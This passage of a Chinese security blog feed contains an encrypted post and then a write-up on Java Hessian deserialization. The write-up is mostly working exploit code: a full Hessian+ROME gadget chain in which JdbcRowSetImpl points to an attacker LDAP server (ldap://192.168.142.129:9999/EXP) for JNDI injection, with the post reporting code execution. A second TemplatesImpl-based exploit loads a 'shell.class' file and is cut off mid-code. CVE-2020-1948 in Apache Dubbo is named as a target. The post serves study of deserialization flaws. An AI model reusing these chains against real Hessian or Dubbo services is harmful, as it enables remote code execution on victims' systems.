e3aacc91636038e193557bf796808c035c136aa66b24251984dcf3533b0da3878bc53480eb2fb78a4c67523d2918437a851f579b239837012eb0a1e9ce893f06157e3cd17ca6932969293d2eb2b4adfb3c294df40f13b6a7a6d5de3375e0706945889caeb316ade05f8af0b5b0f1047776446823fc362d70984fbb8cb3686b53e71b071be7504d638b50efcfce17d19eb0d7cbcdc47747cfe76fb4c6941be7cd810af9d11db60264bc9b3eeaa5851b2e4afbdb2dbe43a5c6180dc1f896acefe971374849a3c6ea31b0d65d6fc36d1566bbff6b2982162945674472e1631644d3104ba10ea2a833aca1156ab96d7cb85e59af01ade012a3f7ccc92232c0b7ec118d379c23ba9720050aa033a21370a41f40110024b56ae7b1da0db14ec7364815e807cb3aae2ba982605b80b610196d117e7ec3a0b9dcab50ff241471a6938a2db82d970f4134cab4a948de15e12e7bf34fc0c2ab9f4622a2e557ef739ea7ebfbf38d909228f8ec02a5a65663c4b416294cb27fb5d5f8ccabae7709ab0083b24bdab4fbe7763b609cb7fdb1dc8f90b59dffcb2c645a7f7850224f7d1eabf4943884097b6ae4a446eed86cd93344980f8cf3fb112e366e94a0c43c9aa5023619f8c45a064a81c9defd5126cb28cd4540908fc6af8786a132324ca46f2e82c56bc63fbd7bcf637701c1341b66c9874597c01359c20dd185d7ea5816f1427c27f0323822a8957096c70a3997385d0921d73b5070fddf8b4a91432dbc2eddc0c8ceddf16305f2ec18a156ad1d347a6bcc6733f53358a923e5cfaa03750cb2e9ed2c54bf3c6aedbc6d24401171eab3dd9c4222d49264a93584584d5cd0cc33269c31e894c6aa484f89be8e09cbd68a39197dd2c2f7ed9c727dc51142a0a4b450089f19c0be2a5546c4c7f2f716f85018c030201c30210d22c590ed73ce978cb8144af1ff0f0a3c9098e33dcf3195d4d7097700f46aabb5cf0f927f9f75c526a53ba155fdc1405784b5aa93afb29920fce5ab883e417afe61a3cca2886a52bdce9cd746b1a5f5a98d314f9bb394c70de33dd32a6ad6a1e3928297bfe0361fe6da332f7da85767614eabaf3817e6de07c6ae607ab050f1d3a5c9779947ff91ea8b1cc35834a5b1228de6ca4ab93c471311d4227bae9b4b95a5c990cb507619916bf455e07f015efc06035266aacbbd7863b722aa3f9022f8e218f9bf68870864fb7c555a652b127d4b56af784884e9aa55020218efad3b0e1dcff85041e936812fe35a6c58907b496d25db89021f5806510c6464193cc93e0228e2cbd412a8012c10454491c31203a3dee2757706c03756d3562c60bf6fe969d281f5f73924e014babf1240fb114a4eb7737c4d535e5b4fa19ccda06ef861a3860fbdd8e3fb7c7e933906aa1814bd13abd9b514523c05d11c54b1f5749b26e3934916ea36f19277a2fe0632b2ccfcdc6dcef39bf7483aabc60a4f2825678b03021ffc4806a925128100802b547fc46f132706fdf4df8f2fab7cba99536af1e6b5eb67afa83f49c1d35f5236ac770d76271ad993cd91a5fea51a72bea16906f97adc9554146475d5c80fab3976153d98f635f961272ec460159623a987c6746f03932635faf2afaf0f8c4ae8a5b37b40741c3cf3be3544ff902cae80be341d812ac84d6909a02e47165598964d531f107fd34230ac717926078bc2e16ae8338d87a950538b77050d49c7bb8bd58eadc27d1f9b508ad0869a49467323e920c204655683cf36c3d750aa37b78f0cd005694d2baffa11784cb405fd572112d276000a4df9e6fe77b1b67e1c37cd115ee012e192ba971fa8d21774405f7715ade6b172ac6585cd1db2557148385722cb329544797ac1c34e745abaf7e85db13f352294d283877c39a3bdc6e92818f493e6d5a3268a5227a426acc280ee751f1980b454df84ed0ae51c58f70e60b6d3fbd92effb3f7a1aadcba19db2b837957dc402938494f0119dc4d6c4eeb919123c26ade59cc929eded2fc80090c550eaaa0b9ec4c89c05c1e9fe33982dd7e21907897b67d89c18f709405b5a307c494b7819b99d39a7053d5971ef1da0d08ddc63efff5c0441e23f973ed8a8c9e1540ed2dea2c3ae5249111e598fefecd9fe6c78560c855f4e55ddd22950c7f810a7b1d50c2ae6f1aac0594d44ed0920bbe6d5034c99a6c143ed8f3009999ea86f67f3e21b78775170827035c53b9e3f31dcfbcbd035623219eba007c19c42539cb31e4b19cf690492d0157483874ab163d564d99a0b23af861d38015afa259e8bf986aa1c370a30be64fe68b45449963c7f8c71f6ffa9f189a8e869617675d263265d1f45464e1d1552932d174e86b63390529db7256fae321f48567632c5cff8d3a3c6317b895d84ebe26cbc53cd1bee2527425f99631b350675a7ccfcf65fdf154ff5d946ab58679e8ef24740d4c66f28b43a28128a1835868fcb50c7a39727f9b4afe295af3da8944832708ae0e574463275a0c04dff46cbd5f6fe5bbae1177fbd9742a5e22876d33db98c0d680a2993f08fea186e80fff0019da87418550366f22b0159facc160c0a79d1cfb0cc6ebe6c7024343c445821799661894add7b05b2f2c0a978bee02ccec385e56364ee669cef804880c162425ab58e663239a4625b716fbc0d6f465744a77cb45d8fae497ed503176152511342268c50b966eb7008eb3235842ac965a4f87ff18cc6e093bf8f47c490bddf6934d2aaf47a0f4727a083533e8a51f249e218d7ea04c2c10d091ea423a362e940bb741f476af83c48cb7923376b7d8f8010839510aad4ea40357371b57adb9dc4a72e7c0be112c353e2d58a424470a03113c1b94533e53c65194b2a26a6913b832e6f33d561c249653c657efc376c88ba485827f071f1c01748fe25069e211fb0413717b7b1ceecb2dc265c351d706e6785cea7ace612dc409b71aab9e6a58a1d1085873380a15ef5f540980fdce8f110c92dbd0dbd2d752b2c971838ee2fb3aebb5cacdef6eab44d803be2b68bf495a34337cdd9ca9088349055579b28de3d219c8eaff763efb695ac0489fcecb784f8e280b98076f6aa63f494b4515751fbbe020add8ec3338e6a7c2874294852f413218e4bb5433eac1a1d81e9e8e3201e5c98d183b57752c82879d733954f841b4363c6f8dc62943e7b35ce57342d35793d72cbf0dc404ce2a7d278874ae85be92b5fc3b988ed4d3cfeb760637af17af304323e5ecb14209b3f8efd0b9cfd826544d25485696e1bd7213dc9af2e350f83453dfd1d24f4fbf12e2bcb1596c8551eff327b6105ee3d7b6df13c89abb3a95e2de35fbf36b16b021088fca68faea0504c351aa2628502062b1f6319c080461f52104f53332b200c07040eedc4b09914fb451cd8b7c37a89a97ff68ac8fbe6f507c882688b7c507124d94ba2e4b93e0fbc6095d1229ad42b0dd618e55aafb1fcadefbdbd2520f0d0d58af129a2e4ff94e955e5f77434b87dac739c9144aff59f56c8098fb1898dfa1dfb2f53273e021416903b01740ed79ba558c38c7e326750ec341fbdb5f5d994fd041052c0647bd3e888f17e664ce3088f7a4d9ce1b79ca87dbb89bd07e445e8e3679a4bf356de72e6f2840ee7f1ac0b6c0a360acd2f31242eb1ef9f5719e91afce4f3b4473eec407d5b285ced40d9c07c550cba77720bdb6f89d107302e883a83e0ffd52b4dce692a026cbd2c5482e06d2f5745222cb9f34e071725f527005f9b4e68bd2715f8d9e504a58cc17d82be83e4c4fe6d6c04ed58a8ddd072a0d9061662ae147442cdbc4bbdedd3fc97a347ee3cf3d0c0765a9088b0e3d43ede44b0fad988953039e379c9739f2a034bd1007063832e43e491854caedccd799f287cc02e562b90bd5ae028fcf9009d59aa49a3e5e96ce40f5fb2a469a7a2503e8e1aa5fcc3375cba4d0ac7d0f98e22418449c27208d7c6eaa4eae5bd81fc537ac9bc6bc4d3627de28167830bb8314ec5ff4a446384069f33b4c3f591e8d08b07514bf226be0fc7a4264bc29fc749006b9984a137f275876ab02ad37ce57b1548cabd9b8df86ba35e67ab7f951f25fb2bd9d8c8e29b0b715bde09470efa62817dbe63c3980f735de677e09e4187d951548198de8554cca60f0b2f33e345c569ae20c94106b529272ef4ca7d584c474124696bc18885e4fba151c9278069e55d88696faf0f4ef320259b0bdedbce4c0b34557b59f6814f2161e42e9faf93efb5a1db5bb72d8485bcd4a9fd697034afb33d72b64370989bd536e560d8e8506083ad30f6cb9b902b710c015f7f7dfb5f38f0057dd0b2ac1d8ee19518289449aeb0a256e674b0fbc7f46d85e03283ce8a0e6138933417e8e05005442b6997a5d54b95a860d2f532b18647f16eab275c64880a4815dbb4aab6b4bd24e156d930b4389b0b39f6777796976a0d5e53348a7d03744e307a78448a436bbd8ff8366fdb9c80b03ffe2c11afbada722e688bc2e36e8b240df983f30f2d183e7d11e881edb89f148e7cddb074dacd5d13f6882d0d3166655ee8b85b421d9b6bdd839af75b5d52270130c5e4b8bd98652223cb9a76c9a44122775d770faa159982715d37e99fc19e910</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-SSRF" scheme="https://ke1nys.github.io/tags/show-SSRF/"/>
    
  </entry>
  
  <entry>
    <title>java-Hessian</title>
    <link href="https://ke1nys.github.io/posts/8319cacd.html"/>
    <id>https://ke1nys.github.io/posts/8319cacd.html</id>
    <published>2023-06-25T06:40:33.000Z</published>
    <updated>2023-07-06T14:02:11.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1193">文章1</a>    <a href="https://su18.org/post/hessian/#xbean">文章2</a>  <a href="https://juejin.cn/post/7130570567547093023">文章3  字节</a>    <a href="http://moonflower.fun/index.php/2022/05/28/336/">文章4</a></p><p>这里前言和简介就不写了  上面给的文章写的都很清楚了   直接看就行了</p><p>(<strong>就是prc啥的  直接看上面的文章就行了</strong>)</p><p>这里的只分析链子</p><h2 id="Hessian反序列化漏洞分析"><a href="#Hessian反序列化漏洞分析" class="headerlink" title="Hessian反序列化漏洞分析"></a>Hessian反序列化漏洞分析</h2><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p><p><code>HessianInput#readObject</code>部分代码如下</p><p><img src="../images/image-20230625153912111.png" alt="image-20230625153912111"></p><p>打个断点来进行分析</p><p><img src="../images/image-20230625153943252.png" alt="image-20230625153943252"></p><p>跟进这个<code>readMap</code>()方法</p><p><img src="../images/image-20230625154035372.png" alt="image-20230625154035372"></p><p>接着跟进这个<code>getDeserializer</code>()方法    获取反序列化的返回结果</p><p><img src="../images/image-20230625154203052.png" alt="image-20230625154203052"></p><p>在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><strong>看过rome链子的应该能反应过来这里 </strong>    <code>hashmap</code>   <code>key</code></p><p>后续代码能够触发任意类的<code>hashcode()</code>方法</p><p><img src="../images/image-20230625160235189.png" alt="image-20230625160235189"></p><p>因为这个<code>key</code>可控</p><p>至此，我们Gadget的构造思路也就十分清晰了，只需要找一条入口为hashcode()的反序列化链即可，比如我们常用的ROME链</p><h3 id="Hessian-Rome"><a href="#Hessian-Rome" class="headerlink" title="Hessian+Rome"></a>Hessian+Rome</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>利用链如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JNDI</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://192.168.142.129:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230706165052839.png" alt="image-20230706165052839"></p><p><img src="../images/image-20230706165058207.png" alt="image-20230706165058207"></p><p>成功弹出计算器</p><h3 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）"><a href="#Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）"></a>Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h3><p>Apache Dubbo 是一款高性能的开源Java RPC框架。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6</li><li>2.6.0 &lt;= Dubbo Version &lt;= 2.6.7</li><li>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</li></ul><p><strong>这里的就不写了  了解一下就行了  因为搭建环境太麻烦了</strong></p><h3 id="TemplatesImpl-SignedObject二次反序列化-ROME不出网"><a href="#TemplatesImpl-SignedObject二次反序列化-ROME不出网" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化(ROME不出网)"></a>TemplatesImpl+SignedObject二次反序列化(ROME不出网)</h3><p>上文我们构造的都是<code>JdbcRowSetImpl</code>这条ROME链，最终结果是造成JNDI注入。那如果目标不出网，我们又怎么利用呢？</p><p>或许你还记得ROME中的<code>TemplatesImpl</code>利用链，其能够加载任意类，进而任意代码执行。下面我们来尝试构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\google download\\shell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        